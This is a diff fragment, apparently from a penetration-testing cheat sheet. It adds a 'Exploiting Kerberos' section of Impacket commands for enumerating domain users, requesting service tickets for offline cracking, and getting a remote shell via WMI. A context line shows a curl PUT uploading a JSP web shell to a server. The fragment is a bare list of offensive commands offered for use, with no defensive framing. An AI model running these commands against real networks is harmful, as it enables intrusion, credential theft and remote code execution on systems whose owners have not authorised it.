@@ -268,3 +268,15 @@ shell.jsp:
 ```
 curl -X PUT https://example/path/where/to/put/shell.jsp/ -d @- < shell.jsp
 ```
+
+### [Exploiting Kerberos]
+```
+Retrieving information from kerberos
+GetADUsers.py -all <domain>/<username> -dc-ip <ipaddr>
+
+Retrieving a ticket from kerberos
+GetUserSPNs.py <domain>/<username> -dc-ip <ipaddr> -request
+
+Shell Execution through wmi
+wmiexec.py <domain>/<username>:<password>@<ipaddr>
+```
